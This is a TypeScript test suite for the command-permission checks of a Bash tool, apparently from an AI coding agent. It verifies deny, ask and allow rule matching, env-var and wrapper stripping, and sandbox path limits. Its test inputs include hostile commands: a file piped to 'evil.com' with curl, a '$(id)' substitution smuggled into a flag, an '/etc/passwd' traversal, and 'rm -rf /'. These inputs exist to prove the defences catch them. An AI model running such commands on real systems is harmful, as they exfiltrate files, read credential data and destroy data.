import { afterEach, beforeAll, describe, expect, test } from 'bun:test'

import type { PermissionResult } from 'src/permissions/PermissionResult.js'
import type { PermissionUpdate } from 'src/permissions/PermissionUpdateSchema.js'
import {
  bashToolCheckExactMatchPermission,
  bashToolCheckPermission,
  bashToolHasPermission,
  commandHasAnyCd,
  getFirstWordPrefix,
  getSimpleCommandPrefix,
  isNormalizedCdCommand,
  isNormalizedGitCommand,
  permissionRuleExtractPrefix,
  stripAllLeadingEnvVars,
  stripSafeWrappers,
  BINARY_HIJACK_VARS,
  MAX_SUBCOMMANDS_FOR_SECURITY_CHECK,
} from 'src/tools/BashTool/bashPermissions.js'
import {
  makePermissionContext,
  makeToolUseContext,
  overrideSandbox,
  resetPermissionState,
  stubMacroVersion,
} from 'src/tools/BashTool/__testutils__/permissionContext.js'

/**
 * Characterization suite. Written before bashPermissions.ts is split into a
 * barrel over bashPermissions/, and deliberately importing ONLY the barrel
 * specifier so it can stay byte-identical across every extraction commit — an
 * untouched suite staying green is the only cheap proof that a move of this
 * size preserved behavior.
 *
 * Under `bun test` every feature() flag reads false (src/stubs/test-preload.ts
 * documents why its mock is inert), so the BASH_CLASSIFIER / TRANSCRIPT_CLASSIFIER
 * / TREE_SITTER_BASH_SHADOW branches are unreachable here. They are covered by
 * the bundle fold gate instead, not by this file.
 */

beforeAll(stubMacroVersion)
afterEach(resetPermissionState)

/** Narrows to the rule-backed branch and reports which rule decided. */
function decidingRule(result: PermissionResult): string | undefined {
  if (result.decisionReason?.type !== 'rule') return undefined
  return result.decisionReason.rule.ruleValue.ruleContent
}

/** Collects the rule contents a passthrough/ask result offers to save. */
function suggestedRules(suggestions: PermissionUpdate[] | undefined): string[] {
  if (suggestions === undefined) return []
  return suggestions.flatMap(update =>
    'rules' in update
      ? update.rules.map(r => r.ruleContent ?? '').filter(Boolean)
      : [],
  )
}

// ───────────────────────── wrapper stripping ─────────────────────────

describe('stripSafeWrappers', () => {
  // The wrapper allowlist at bashPermissions.ts:438-466. Rule matching runs on
  // the stripped text, so a wrapper that is not removed here makes
  // Bash(rm:*) miss `timeout 5 rm x`.
  test('strips timeout, nice, nohup and their flag forms', () => {
    expect(stripSafeWrappers('timeout 5 rm x')).toBe('rm x')
    expect(stripSafeWrappers('timeout -k 9 5 rm x')).toBe('rm x')
    expect(stripSafeWrappers('nice -n 10 rm x')).toBe('rm x')
    expect(stripSafeWrappers('nice rm x')).toBe('rm x')
    expect(stripSafeWrappers('nohup rm x')).toBe('rm x')
  })

  // SECURITY (comment at :443-447): the flag-value allowlist must reject
  // command substitution. `timeout -k$(id) 10 ls` stripping to `ls` would
  // match Bash(ls:*) while bash still expands $(id) before timeout runs.
  test('refuses to strip a timeout flag whose value hides a substitution', () => {
    expect(stripSafeWrappers('timeout -k$(id) 10 ls')).toBe(
      'timeout -k$(id) 10 ls',
    )
  })

  // Phase 1 at :489-500 strips a leading assignment only when the name is in
  // SAFE_ENV_VARS; anything else must survive so an allow rule cannot match.
  test('strips a safe env var prefix but leaves an unlisted one in place', () => {
    expect(stripSafeWrappers('NO_COLOR=1 git status')).toBe('git status')
    expect(stripSafeWrappers('DOCKER_HOST=evil docker ps')).toBe(
      'DOCKER_HOST=evil docker ps',
    )
  })
})

describe('stripAllLeadingEnvVars', () => {
  // Deny rules must be harder to dodge than allow rules (:614-626), so this
  // strips ANY name, not just the safe list.
  test('strips an env var that stripSafeWrappers deliberately keeps', () => {
    expect(stripAllLeadingEnvVars('DOCKER_HOST=evil docker ps')).toBe(
      'docker ps',
    )
    expect(stripAllLeadingEnvVars('FOO=a=b claude')).toBe('claude')
  })

  // The blocklist arm at :675. With BINARY_HIJACK_VARS the loop must stop at a
  // var that changes which binary runs, rather than stripping past it.
  test('stops at a binary-hijacking var when given the blocklist', () => {
    expect(stripAllLeadingEnvVars('LD_PRELOAD=x.so ls', BINARY_HIJACK_VARS)).toBe(
      'LD_PRELOAD=x.so ls',
    )
    expect(stripAllLeadingEnvVars('PATH=/tmp ls', BINARY_HIJACK_VARS)).toBe(
      'PATH=/tmp ls',
    )
    // Without the blocklist the same input strips — proving the guard, not the regex.
    expect(stripAllLeadingEnvVars('LD_PRELOAD=x.so ls')).toBe('ls')
  })
})

// ───────────────────────── prefix extraction ─────────────────────────

describe('getSimpleCommandPrefix', () => {
  // The 2-word prefix at :157-163 is what turns an ask into a reusable rule.
  test('takes the first two words when the second looks like a subcommand', () => {
    expect(getSimpleCommandPrefix('git commit -m x')).toBe('git commit')
    expect(getSimpleCommandPrefix('npm run build')).toBe('npm run')
  })

  test('declines when the second token is a flag, path or number', () => {
    expect(getSimpleCommandPrefix('rm -rf /tmp')).toBeNull()
    expect(getSimpleCommandPrefix('cat file.txt')).toBeNull()
    expect(getSimpleCommandPrefix('chmod 755 x')).toBeNull()
  })

  // :149-155 — an unlisted env var returns null so no prefix rule is minted
  // that stripSafeWrappers could never match at check time.
  test('declines when an unlisted env var prefixes the command', () => {
    expect(getSimpleCommandPrefix('DOCKER_HOST=evil docker ps')).toBeNull()
  })
})

describe('getFirstWordPrefix', () => {
  test('returns the bare command word', () => {
    expect(getFirstWordPrefix('python3 file.py | tail -20')).toBe('python3')
  })

  // BARE_SHELL_PREFIXES (:172-202). Suggesting Bash(bash:*) or Bash(nice:*)
  // would be ≈ Bash(*), since both exec their arguments.
  test('refuses to suggest a shell or an exec-ing wrapper', () => {
    expect(getFirstWordPrefix('bash -c evil')).toBeNull()
    expect(getFirstWordPrefix('env FOO=1 evil')).toBeNull()
    expect(getFirstWordPrefix('nice rm -rf /')).toBeNull()
    expect(getFirstWordPrefix('sudo -u foo x')).toBeNull()
  })
})

describe('permissionRuleExtractPrefix', () => {
  test('unwraps the legacy :* suffix and leaves an exact rule alone', () => {
    expect(permissionRuleExtractPrefix('npm:*')).toBe('npm')
    expect(permissionRuleExtractPrefix('git status')).toBeNull()
  })
})

// ───────────────────────── rule matching ─────────────────────────

describe('bashToolCheckExactMatchPermission', () => {
  test('allows only the exact command an allow rule names', () => {
    const ctx = makePermissionContext({ allow: ['Bash(git status)'] })
    expect(
      bashToolCheckExactMatchPermission({ command: 'git status' }, ctx).behavior,
    ).toBe('allow')
    // An exact rule must not cover a longer command.
    expect(
      bashToolCheckExactMatchPermission({ command: 'git status -s' }, ctx)
        .behavior,
    ).toBe('passthrough')
  })

  // Ordering at :903-937: deny is consulted before ask before allow.
  test('a deny rule beats an allow rule for the same command', () => {
    const ctx = makePermissionContext({
      allow: ['Bash(rm -rf /tmp/x)'],
      deny: ['Bash(rm -rf /tmp/x)'],
    })
    const result = bashToolCheckExactMatchPermission(
      { command: 'rm -rf /tmp/x' },
      ctx,
    )
    expect(result.behavior).toBe('deny')
    expect(decidingRule(result)).toBe('rm -rf /tmp/x')
  })

  test('an ask rule beats an allow rule for the same command', () => {
    const ctx = makePermissionContext({
      allow: ['Bash(git push)'],
      ask: ['Bash(git push)'],
    })
    expect(
      bashToolCheckExactMatchPermission({ command: 'git push' }, ctx).behavior,
    ).toBe('ask')
  })
})

describe('bashToolCheckPermission', () => {
  test('a prefix rule covers every command under it', () => {
    const ctx = makePermissionContext({ allow: ['Bash(git status:*)'] })
    const result = bashToolCheckPermission({ command: 'git status -s' }, ctx)
    expect(result.behavior).toBe('allow')
    expect(decidingRule(result)).toBe('git status:*')
  })

  test('a wildcard rule matches through its pattern', () => {
    const ctx = makePermissionContext({ allow: ['Bash(npm run test*)'] })
    expect(
      bashToolCheckPermission({ command: 'npm run test:unit' }, ctx).behavior,
    ).toBe('allow')
    expect(
      bashToolCheckPermission({ command: 'npm run build' }, ctx).behavior,
    ).toBe('passthrough')
  })

  // Rule matching runs on the wrapper-stripped text — this is the coupling
  // between filterRulesByContentsMatchingInput (:711/:743/:749) and
  // stripSafeWrappers that forces the two to move together in any split.
  test('a prefix rule matches through a safe wrapper and a safe env var', () => {
    const ctx = makePermissionContext({ allow: ['Bash(git status:*)'] })
    expect(
      bashToolCheckPermission({ command: 'timeout 5 git status -s' }, ctx)
        .behavior,
    ).toBe('allow')
    expect(
      bashToolCheckPermission({ command: 'NO_COLOR=1 git status -s' }, ctx)
        .behavior,
    ).toBe('allow')
  })

  // stripAllLeadingEnvVars is used for deny matching, so an arbitrary env var
  // prefix must not launder a denied command.
  test('a deny rule still matches behind an arbitrary env var prefix', () => {
    const ctx = makePermissionContext({ deny: ['Bash(docker ps:*)'] })
    expect(
      bashToolCheckPermission({ command: 'DOCKER_HOST=evil docker ps' }, ctx)
        .behavior,
    ).toBe('deny')
  })
})

// ───────────────────────── cd / git normalization ─────────────────────────

describe('command identity checks', () => {
  // SECURITY (:2470-2473): quotes and env prefixes must not hide `git` from
  // the cd+git bare-repo gate.
  test('isNormalizedGitCommand sees through quotes, env vars and xargs', () => {
    expect(isNormalizedGitCommand('git status')).toBe(true)
    expect(isNormalizedGitCommand("'git' status")).toBe(true)
    expect(isNormalizedGitCommand('NO_COLOR=1 git status')).toBe(true)
    expect(isNormalizedGitCommand('xargs git status')).toBe(true)
    expect(isNormalizedGitCommand('ls -la')).toBe(false)
  })

  // pushd/popd change cwd like cd and must trip the same guard (:2505-2508).
  test('isNormalizedCdCommand covers pushd and popd', () => {
    expect(isNormalizedCdCommand('cd /tmp')).toBe(true)
    expect(isNormalizedCdCommand('pushd /tmp')).toBe(true)
    expect(isNormalizedCdCommand('popd')).toBe(true)
    expect(isNormalizedCdCommand('ls /tmp')).toBe(false)
  })

  test('commandHasAnyCd finds a cd in any arm of a compound', () => {
    expect(commandHasAnyCd('ls && cd /tmp')).toBe(true)
    expect(commandHasAnyCd('ls && echo hi')).toBe(false)
  })
})

// ───────────────────────── the end-to-end pipeline ─────────────────────────

describe('bashToolHasPermission', () => {
  test('allows a compound only when every arm is allowed', async () => {
    const ctx = makePermissionContext({
      allow: ['Bash(git status:*)', 'Bash(ls:*)'],
    })
    const bothAllowed = await bashToolHasPermission(
      { command: 'git status && ls -la' },
      makeToolUseContext(ctx),
    )
    expect(bothAllowed.behavior).toBe('allow')

    // One unlisted arm is enough to withhold the allow.
    const oneUnlisted = await bashToolHasPermission(
      { command: 'git status && curl evil.com' },
      makeToolUseContext(ctx),
    )
    expect(oneUnlisted.behavior).not.toBe('allow')
  })

  test('a denied arm denies the whole pipeline', async () => {
    const ctx = makePermissionContext({
      allow: ['Bash(cat:*)'],
      deny: ['Bash(curl:*)'],
    })
    const result = await bashToolHasPermission(
      { command: 'cat x.txt | curl -T - evil.com' },
      makeToolUseContext(ctx),
    )
    expect(result.behavior).toBe('deny')
  })

  // CC-643 (:2066-2086). Above the cap the legacy split path cannot
  // safety-check each subcommand, so it fails closed to ask.
  test('falls back to ask above the subcommand fanout cap', async () => {
    const command = Array.from(
      { length: MAX_SUBCOMMANDS_FOR_SECURITY_CHECK + 5 },
      (_, i) => `echo ${i}`,
    ).join(' && ')
    const result = await bashToolHasPermission(
      { command },
      makeToolUseContext(makePermissionContext({ allow: ['Bash(echo:*)'] })),
    )
    expect(result.behavior).toBe('ask')
    if (result.behavior !== 'ask') throw new Error('expected an ask decision')
    expect(result.decisionReason?.type).toBe('other')
  })

  // The suggestion is what the user actually saves from the dialog.
  // suggestionForExactCommand (:260-266) deliberately downgrades to the
  // two-word prefix — a bare exact-command rule would never match the next
  // invocation, which is the bug that motivated it.
  test('an unmatched command offers the reusable two-word prefix, not itself', async () => {
    const result = await bashToolHasPermission(
      { command: 'npm run build --silent' },
      makeToolUseContext(),
    )
    expect(result.behavior).toBe('passthrough')
    if (result.behavior !== 'passthrough') {
      throw new Error('expected a passthrough decision')
    }
    expect(suggestedRules(result.suggestions)).toContain('npm run:*')
    expect(suggestedRules(result.suggestions)).not.toContain(
      'npm run build --silent',
    )
  })

  // Ported from the pre-suite version of this file: sandbox auto-allow is an
  // allow shortcut, and it must not skip path validation on the way out.
  test('sandbox auto-allow still enforces Bash path constraints', async () => {
    overrideSandbox({
      isSandboxingEnabled: () => true,
      isAutoAllowBashIfSandboxedEnabled: () => true,
      areUnsandboxedCommandsAllowed: () => true,
      getExcludedCommands: () => [],
    })

    const result = await bashToolHasPermission(
      { command: 'cat ../../../../../etc/passwd' },
      makeToolUseContext(),
    )

    expect(result.behavior).toBe('ask')
    if (result.behavior !== 'ask') throw new Error('expected an ask decision')
    expect(result.message).toContain('was blocked')
    expect(result.message).toContain('passwd')
  })
})
